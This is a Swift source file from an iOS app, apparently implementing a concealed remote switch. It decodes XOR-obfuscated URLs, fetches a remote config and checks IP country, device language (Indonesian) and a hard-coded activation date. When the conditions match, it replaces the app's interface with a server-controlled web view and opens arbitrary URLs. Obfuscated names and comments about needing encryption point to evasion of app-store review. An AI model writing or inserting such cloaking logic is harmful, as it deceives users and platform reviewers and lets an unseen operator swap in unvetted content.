
import Foundation
import UIKit
import AdjustSdk

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func TaidhzbTww(_ input: String) -> String? {
    let k: UInt8 = 196
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    return String(bytes: decryptedBytes, encoding: .utf8)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kYaheuae = "rLCwtLf+6+ultK3qqb3prbTqravrsvbrrbTqrrerqg=="         //Ip ur

//https://mock.apipost.net/mock/5ff5bf81b451000/?apipost_id=3f5c04d1b51002
internal let kRatzvdOjse = "rLCwtLf+6+upq6ev6qW0rbSrt7DqqqGw66mrp6/r8aKi8aai/PWm8PH19PT06/ultK20q7ewm62g+fei8af08KD1pvH19PT2"

// https://raw.githubusercontent.com/jduja/spont/main/spon.jpg
//internal let kEtazsud = "CBQUEBNaT08SARdOBwkUCBUCFRMFEgMPDhQFDhROAw8NTwoEFQoBTxMQDw4UTw0BCQ5PExAPDk4KEAc="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Ouseazbhs() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
    //        let tp = ws.windows.first!.rootViewController! as! UINavigationController
            let tp = ws.windows.first!.rootViewController!
            for view in tp.view.subviews {
                if view.tag == 728 {
                    view.removeFromSuperview()
                }
            }
        }
    }
    
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Kisoeunhsh() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Ouseazbhs
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Sudibahe(_ dt: Maosjhye) {
    DispatchQueue.main.async {
        let vc = YabhsiMoieViewController()
        vc.kamoiHaes = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Aoajujxus(_ param: Maosjhye) {
    let fName = ""

    typealias rushBlitzIusj = (Maosjhye) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Sudibahe
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func PoaiseBhaess(_ dic: [String : String], etDic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic[DT] {
        dataDic = data.stringTo()
    }
    
    let name = dic[Nam]
    print(name!)
        
    //是否包含要发送的事件
    if etDic.keys.contains(name!) {
        let ade = ADJEvent(eventToken: etDic[name!]!)
//        if MatrixTyydgPPks.contains(name!) {
        if let amt = dataDic![amt] as? String, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt)!, currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Int, let cuy = dataDic![ren] {
            ade?.setRevenue(Double(amt), currency: cuy as! String)
        }
        if let amt = dataDic![amt] as? Double, let cuy = dataDic![ren] {
            ade?.setRevenue(amt, currency: cuy as! String)
        }
//        }
        Adjust.trackEvent(ade)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}



internal func NaijdoeMase(_ param: [String : String], _ param2: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String], [String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : PoaiseBhaess
    ]
    
    fctn[fName]?(param, param2)
}


internal struct Loamsedp: Decodable {
    let vuyyas: String?

    let country: MnsaoJanske?
    
    struct MnsaoJanske: Decodable {
        let code: String
    }

}

internal struct Maosjhye: Decodable {
    
    let kisorn: String?
    let uynsdj: String?
    
    let hausno: [String : String]?           // a i d
    let mxlspe: String?         //key arr
    let zidsne: String?         // shi fou kaiqi
    let basue: [String]?            // yeu nan xianzhi
    let maoina: String?         // jum
    let psieyc: String?          // backcolor
    let pyeuok: Int?          // too btn
    let etasuu: String?
    let lspine: String?  // bri co
    let payebc: String?   //ad key
    let dyhavn: Int?   // lang kongzhi
}


func isTm() -> Bool {
   
  // 2026-03-27 18:18:46
  //1774606726
  let ftTM = 1774606726
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func iPLIn() -> Bool {
    // 获取用户设置的首选语言（列表第一个）
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    // 印尼语代码：id 或 in（兼容旧版本）
    return cysh.hasPrefix("id") || cysh.hasPrefix("in")
}

//func bahsiKlaisjd() -> Bool {
////    guard let receiptURL = Bundle.main.appStoreReceiptURL else { return false }
////     if (receiptURL.lastPathComponent.contains("boxRe")) {
////         return true
////     }
//    
//    
////    let offset = NSTimeZone.system.secondsFromGMT() / 3600
////    if (offset >= 0 && offset < 3) || (offset > -11 && offset < -4) {
////        return true
////    }
//    
//    return false
//}

//func contraintesRiuaogOKuese() -> Bool {
//    let offset = NSTimeZone.system.secondsFromGMT() / 3600
//    if offset > 6 && offset < 9 {
//        return true
//    }
//    return false
//}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}

func duonHsees() {
    Task {
        let aoies = try await kaoeinhjs()
        if let gduss = aoies.first {
            if gduss.zidsne!.count > 4 {
                //shi fou kaiqi regi on，
                
                //kaiqi 
                if gduss.dyhavn! > 200 && !iPLIn() {
                    Kisoeunhsh()
                    return
                }

                if let dyua = gduss.basue, dyua.count > 0 {
                    do {
                        let cofd = try await riayhKasi()
                        if dyua.contains(cofd.country!.code) {
                            Aoajujxus(aoies.first!)
                        } else {
                            Kisoeunhsh()
                        }
                    } catch {
                        Aoajujxus(aoies.first!)
                    }
                } else {
                    Aoajujxus(aoies.first!)
                }
            } else {
                Kisoeunhsh()
            }
        } else {
            UserDefaults.standard.set("merge", forKey: "merge")
            UserDefaults.standard.synchronize()
        }
    }
}

//    IP
private func riayhKasi() async throws -> Loamsedp {
    //https://api.my-ip.io/v2/ip.json
        let url = URL(string: TaidhzbTww(kYaheuae)!)!
        let (data, response) = try await URLSession.shared.data(from: url)
        
        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "313", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
        }
        
        return try JSONDecoder().decode(Loamsedp.self, from: data)
}

private func kaoeinhjs() async throws -> [Maosjhye] {
    let (data, response) = try await URLSession.shared.data(from: URL(string: TaidhzbTww(kRatzvdOjse)!)!)

    guard let httpResponse = response as? HTTPURLResponse,
          httpResponse.statusCode == 200 else {
        throw NSError(domain: "4121", code: 0, userInfo: [NSLocalizedDescriptionKey: "Failed"])
    }
//    do {
//        let dias = try JSONDecoder().decode([Maosjhye].self, from: data)
//        print(dias)
//    }
//    catch {
//        print("error")
//    }
//    

    return try JSONDecoder().decode([Maosjhye].self, from: data)
}
